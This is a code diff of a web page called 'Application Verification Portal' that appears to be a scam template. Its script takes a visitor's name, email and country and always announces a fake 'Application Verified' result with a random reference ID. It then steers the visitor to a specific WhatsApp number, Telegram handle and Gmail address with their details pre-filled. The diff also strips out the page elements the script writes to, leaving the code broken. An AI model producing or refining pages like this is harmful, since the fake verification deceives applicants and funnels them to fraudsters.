@@ -1,144 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Application Verification Portal</title>
-
-<style>
-body {
-  margin: 0;
-  font-family: Arial, sans-serif;
-  background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
-  color: white;
-  text-align: center;
-}
-
-.container {
-  max-width: 480px;
-  margin: 40px auto;
-  background: white;
-  color: black;
-  padding: 25px;
-  border-radius: 14px;
-  box-shadow: 0 12px 30px rgba(0,0,0,0.3);
-}
-
-h1 {
-  font-size: 22px;
-  margin-bottom: 5px;
-}
-
-.sub {
-  font-size: 13px;
-  color: gray;
-  margin-bottom: 20px;
-}
-
-input, select, textarea {
-  width: 92%;
-  padding: 12px;
-  margin: 8px 0;
-  border: 1px solid #ddd;
-  border-radius: 8px;
-  font-size: 14px;
-}
-
-textarea {
-  resize: none;
-  height: 80px;
-}
-
-button {
-  width: 95%;
-  padding: 12px;
-  background: #1db954;
-  border: none;
-  color: white;
-  font-weight: bold;
-  border-radius: 8px;
-  cursor: pointer;
-  margin-top: 10px;
-}
-
-button:hover {
-  background: #17a44a;
-}
-
-.status {
-  margin-top: 15px;
-  font-weight: bold;
-  color: #1db954;
-}
-
-.small {
-  font-size: 12px;
-  color: gray;
-  margin-top: 10px;
-}
-
-.links a {
-  display: block;
-  margin-top: 10px;
-  padding: 10px;
-  background: #111;
-  color: white;
-  border-radius: 8px;
-  text-decoration: none;
-}
-</style>
-</head>
-
-<body>
-
-<div class="container">
-
-  <h1>Application Verification Portal</h1>
-  <p class="sub">
-    Submit your application for eligibility review and verification processing
-  </p>
-
-  <!-- FORM -->
-  <input id="name" type="text" placeholder="Full Legal Name">
-  <input id="email" type="email" placeholder="Email Address">
-  <input id="country" type="text" placeholder="Country of Residence">
-
-  <select id="age">
-    <option value="">Select Age Range</option>
-    <option>18–24</option>
-    <option>25–34</option>
-    <option>35–44</option>
-    <option>45+</option>
-  </select>
-
-  <textarea id="reason" placeholder="Why are you applying for this program?"></textarea>
-
-  <button onclick="submitForm()">Submit Application</button>
-
-  <p class="small">
-    All submissions are processed through a secure verification system.
-  </p>
-
-  <div class="status" id="status"></div>
-
-  <div class="links" id="links" style="display:none;">
-    <p>Verification Support Center</p>
-
-    <a href="https://wa.me/18732804513" target="_blank">
-      WhatsApp Support
-    </a>
-
-    <a href="https://t.me/miacwr" target="_blank">
-      Telegram Support
-    </a>
-
-    <a href="mailto:miacarterxoxo17@gmail.com">
-      Email Verification Unit
-    </a>
-  </div>
-
-</div>
-
 <script>
 function submitForm() {
 
@@ -153,23 +12,44 @@ function submitForm() {
     return;
   }
 
-  // STEP 1: processing
+  // Processing stage
   document.getElementById("status").innerText =
     "Submitting application for verification...";
 
-  // STEP 2: simulate review delay
   setTimeout(() => {
 
-    let token = "APP-" + Math.random().toString(36).substring(2,8).toUpperCase();
+    // Generate token
+    let token = "APP-" + Math.random().toString(36).substring(2, 8).toUpperCase();
 
+    // Show result
     document.getElementById("status").innerText =
       "Application Verified ✔ | Reference ID: " + token;
 
+    // Show support section
     document.getElementById("links").style.display = "block";
 
-  }, 3500);
+    // Build professional support message
+    let message =
+      "Hello Support Team,%0A%0A" +
+      "My application has been successfully processed.%0A%0A" +
+      "Full Name: " + name + "%0A" +
+      "Email: " + email + "%0A" +
+      "Country: " + country + "%0A%0A" +
+      "My Reference ID (Token) is: " + token + "%0A%0A" +
+      "Kindly proceed with verification. Thank you.";
+
+    // WhatsApp (your number)
+    document.getElementById("waLink").href =
+      "https://wa.me/18732804513?text=" + message;
+
+    // Telegram (direct channel)
+    document.getElementById("tgLink").href =
+      "https://t.me/miacwr";
+
+    // Email (pre-filled)
+    document.getElementById("mailLink").href =
+      "mailto:miacarterxoxo17@gmail.com?subject=Application%20Verification%20Request&body=" + message;
+
+  }, 3000);
 }
 </script>
-
-</body>
-</html>
